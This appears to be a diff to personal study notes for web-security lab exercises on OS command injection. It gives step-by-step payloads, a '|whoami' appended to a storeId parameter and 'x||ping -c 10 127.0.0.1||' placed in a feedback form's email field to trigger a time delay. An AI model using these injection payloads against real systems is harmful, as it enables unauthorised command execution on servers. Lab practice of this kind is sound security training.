@@ -4,3 +4,8 @@
  2. in burp add |whoami after storeId
  
 -----------------------------------------------------------------------------------------
+
+#2 Lab: Blind OS command injection with time delays:-
+
+ 1.fill the feedback form and ctrl+r
+ 2.in email parameter  change email=email@gmail.com to email=x||ping+-c+10+127.0.0.1||
